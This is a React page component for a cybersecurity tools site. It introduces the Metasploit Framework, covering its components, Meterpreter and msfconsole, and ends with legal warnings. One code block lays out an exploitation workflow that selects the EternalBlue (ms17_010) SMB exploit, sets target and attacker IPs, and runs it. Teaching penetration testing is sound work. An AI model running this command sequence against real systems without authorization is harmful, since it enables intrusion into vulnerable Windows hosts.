import { Link } from "react-router-dom";

export default function Metasploit() {
  return (
<div className="px-10 py-16 max-w-7xl mx-auto text-white">

      <Link
        to="/tools"
        className="inline-block mb-6 text-cyan-400 hover:underline"
      >
        ← Back to Tools
      </Link>

      <h1 className="text-5xl font-bold mb-6 text-cyan-400">
        Metasploit Framework
      </h1>

      <div className="flex flex-wrap gap-3 mb-10">
        <span className="px-3 py-1 text-sm rounded-full bg-green-600/20 text-green-400 border border-green-500/30">
          Beginner Friendly
        </span>
        <span className="px-3 py-1 text-sm rounded-full bg-yellow-600/20 text-yellow-400 border border-yellow-500/30">
          Intermediate
        </span>
        <span className="px-3 py-1 text-sm rounded-full bg-red-600/20 text-red-400 border border-red-500/30">
          Advanced
        </span>
        <span className="px-3 py-1 text-sm rounded-full bg-purple-600/20 text-purple-400 border border-purple-500/30">
          Exploitation
        </span>
      </div>

      {/* WHAT IS METASPLOIT */}
<section className="mb-10">
  <h2 className="text-2xl font-semibold mb-4 text-cyan-300">
    What is Metasploit?
  </h2>

  <p className="text-gray-300 leading-relaxed mb-4">
    <strong>Metasploit Framework</strong> is a powerful, open-source
    <strong> penetration testing and exploitation framework</strong>
    used by cybersecurity professionals to identify, test, and validate
    security vulnerabilities in computer systems, networks, servers,
    and web applications.
  </p>

  <p className="text-gray-300 leading-relaxed mb-4">
    It provides a large collection of ready-made
    <strong> exploits, payloads, scanners, and post-exploitation tools</strong>
    that allow testers to safely simulate real-world cyberattacks.
    This helps organizations understand how attackers could compromise
    their systems and what impact a vulnerability could have.
  </p>

  <p className="text-gray-300 leading-relaxed mb-4">
    Metasploit is widely used in
    <strong> ethical hacking, red teaming, penetration testing, and security research</strong>.
    It supports both automated and manual testing, making it suitable
    for beginners learning cybersecurity as well as advanced professionals.
  </p>

  <p className="text-gray-300 leading-relaxed">
    The framework is developed and maintained by <strong>Rapid7</strong>
    and is included by default in security-focused operating systems
    such as <strong>Kali Linux</strong>.
  </p>
</section>

      {/* WHAT METASPLOIT DOES */}
<section className="mb-10">
  <h2 className="text-2xl font-semibold mb-4 text-cyan-300">
    What Metasploit Does
  </h2>

  <ul className="list-disc list-inside text-gray-300 space-y-3">
    <li>
      <strong>Identifies vulnerabilities:</strong>  
      Scans and checks systems for known security flaws,
      outdated software, and misconfigurations.
    </li>

    <li>
      <strong>Exploits security weaknesses:</strong>  
      Uses verified exploits to safely test whether
      vulnerabilities can be used to gain access.
    </li>

    <li>
      <strong>Delivers payloads and shells:</strong>  
      Executes payloads such as reverse shells and
      Meterpreter sessions after successful exploitation.
    </li>

    <li>
      <strong>Performs post-exploitation activities:</strong>  
      Allows testers to gather system information,
      escalate privileges, and maintain access.
    </li>

    <li>
      <strong>Simulates real-world attacks:</strong>  
      Replicates attacker techniques to understand
      real-world impact and risk.
    </li>

    <li>
      <strong>Validates security defenses:</strong>  
      Helps confirm whether security controls like
      firewalls, antivirus, and IDS are effective.
    </li>
  </ul>
</section>

      {/* CORE COMPONENTS */}
<section className="mb-10">
  <h2 className="text-2xl font-semibold mb-4 text-cyan-300">
    Core Components of Metasploit
  </h2>

  <ul className="list-disc list-inside text-gray-300 space-y-3">
    <li>
      <strong>Exploits:</strong>  
      Programs designed to take advantage of specific
      vulnerabilities in operating systems, services,
      or applications to gain access.
    </li>

    <li>
      <strong>Payloads:</strong>  
      Code that runs after a successful exploit, such as
      command shells, reverse connections, or advanced
      control sessions.
    </li>

    <li>
      <strong>Auxiliary Modules:</strong>  
      Non-exploit tools used for scanning, enumeration,
      fuzzing, and information gathering.
    </li>

    <li>
      <strong>Post Modules:</strong>  
      Modules used after gaining access to perform tasks
      like privilege escalation, credential harvesting,
      and system reconnaissance.
    </li>

    <li>
      <strong>Meterpreter:</strong>  
      A powerful, in-memory payload that provides
      advanced control over the target system without
      writing files to disk.
    </li>
  </ul>
</section>

      {/* USING METASPLOIT (LINUX) */}
<section className="mb-10">
  <h2 className="text-2xl font-semibold mb-4 text-cyan-300">
    Using Metasploit (Linux)
  </h2>

  <p className="text-gray-300 leading-relaxed mb-4">
    Metasploit is commonly used on Linux-based security distributions,
    especially <strong>Kali Linux</strong>, where it comes pre-installed.
    The primary interface for interacting with Metasploit is
    <strong> msfconsole</strong>, an interactive command-line shell.
  </p>

  <p className="text-gray-300 leading-relaxed mb-4">
    The <strong>msfconsole</strong> provides access to all Metasploit
    modules, including exploits, payloads, scanners, and post-exploitation
    tools, allowing testers to perform both manual and automated attacks.
  </p>

  <pre className="bg-black/40 p-4 rounded-lg text-gray-300 text-sm overflow-x-auto">
{`# Start Metasploit Framework
msfconsole`}
  </pre>

  <p className="text-gray-300 leading-relaxed mt-4">
    Once launched, you can search for exploits, configure targets,
    set payload options, and execute attacks directly from the console.
    Most Metasploit workflows begin from this interface.
  </p>
</section>

      {/* COMMON METASPLOIT COMMANDS */}
<section className="mb-10">
  <h2 className="text-2xl font-semibold mb-4 text-cyan-300">
    Common Metasploit Commands
  </h2>

  <p className="text-gray-300 leading-relaxed mb-4">
    Metasploit commands are used inside the <strong>msfconsole</strong>
    to search for vulnerabilities, configure exploits, and execute attacks.
    Below are some commonly used commands with a basic exploitation workflow.
  </p>

  <pre className="bg-black/40 p-4 rounded-lg text-gray-300 text-sm overflow-x-auto">
{`# Search for an exploit or module
search ms17_010

# Select an exploit module
use exploit/windows/smb/ms17_010_eternalblue

# Display required and optional settings
show options

# Set the target system IP address
set RHOSTS 192.168.1.10

# Set the attacker's IP address
set LHOST 192.168.1.5

# Run the exploit
exploit`}
  </pre>

  <ul className="list-disc list-inside text-gray-300 space-y-2 mt-4">
    <li><strong>search</strong> – Finds available exploits and modules</li>
    <li><strong>use</strong> – Loads a specific exploit or module</li>
    <li><strong>show options</strong> – Displays required configuration values</li>
    <li><strong>set</strong> – Assigns values such as target or payload options</li>
    <li><strong>exploit</strong> – Launches the attack</li>
  </ul>
</section>

      {/* LEGAL */}
      <section>
        <h2 className="text-2xl font-semibold mb-4 text-red-400">
          Legal Notice
        </h2>

        <p className="text-gray-300 leading-relaxed">
          Use Metasploit only on systems you own or have explicit permission
          to test. Unauthorized use is illegal.
        </p>
      </section>

      {/* ===============================
    IMPORTANT NOTE
=============================== */}
<section className="bg-red-900/20 border border-red-500/30 rounded-lg p-6">
  <h2 className="text-xl font-semibold mb-3 text-red-400">
    ⚠ Legal & Ethical Warning
  </h2>

  <p className="text-gray-300 leading-relaxed">
    Metasploit should be used <strong>only on systems you own or have
    explicit permission to test</strong>. Using Metasploit against
    unauthorized systems is illegal and may result in serious legal
    consequences.
  </p>
</section>
    </div>
  );
}
